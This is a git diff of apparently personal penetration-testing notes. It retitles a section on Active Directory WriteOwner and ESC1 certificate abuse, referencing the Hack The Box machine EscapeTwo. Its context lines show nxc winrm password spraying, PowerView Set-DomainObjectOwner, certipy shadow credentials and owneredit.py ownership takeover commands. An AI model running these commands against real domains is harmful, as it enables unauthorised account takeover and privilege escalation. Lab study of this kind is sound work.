@@ -249,7 +249,7 @@ bloodhound
 ```bash
 nxc winrm IP -u users.txt -p pass.txt --continue-on-success
 ```
-##### WriteOwner Active Directory
+##### WriteOwner, ESC1 Active Directory
 - In the bloodhound, if any object/user has the `WriteOwner` permission, we can own the object
 - Below permissions are referenced from the [HTB-EscapeTwo](https://app.hackthebox.com/machines/EscapeTwo)
 ```sh
@@ -262,7 +262,7 @@ ryan(Owned with Creds) ----|                                           |-----CA_
 Set-DomainObjectOwner -Identity ca_svc -OwnerIdentity ryan
 ```
 - Above is one way to own, just owning the object
-- Another way is
+- Another way is making this ESC1 certificate vulnerable
 ```bash
 certipy shadow auto -username ryan@sequel.htb -password <PASSWORD> -account ca_svc -dc-ip <IP> # It fails because of the insufficient right to that account
 python3 owneredit.py -action write -new-owner ryan -target ca_svc sequel.htb/ryan:<PASSWORD>   # Now we became the owner of the account
